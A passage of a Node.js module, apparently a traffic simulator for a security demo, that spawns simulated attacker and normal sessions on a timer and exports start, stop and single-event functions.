  for (let i = 0; i < MAX_CONCURRENT_ATTACKERS; i++) spawnAttacker();
  for (let i = 0; i < MAX_CONCURRENT_NORMALS;   i++) spawnNormal();

  simulatorInterval = setInterval(async () => {
    try { await tick(); }
    catch (err) { console.error("Simulator tick error:", err.message); }
  }, TICK_INTERVAL_MS);
}

function stopSimulator() {
  if (!simulatorInterval) return;
  clearInterval(simulatorInterval);
  simulatorInterval = null;
  attackers.clear();
  normals.clear();
  console.log("⏹  Traffic Simulator v3 stopped");
}

// Legacy single-event export (used by some routes)
async function generateLiveEvent() {
  const type    = pick(ATTACK_TYPES);
  const session = new AttackerSession(type);
  await session.fire();
}

module.exports = { startSimulator, stopSimulator, generateLiveEvent, simulatorInterval };
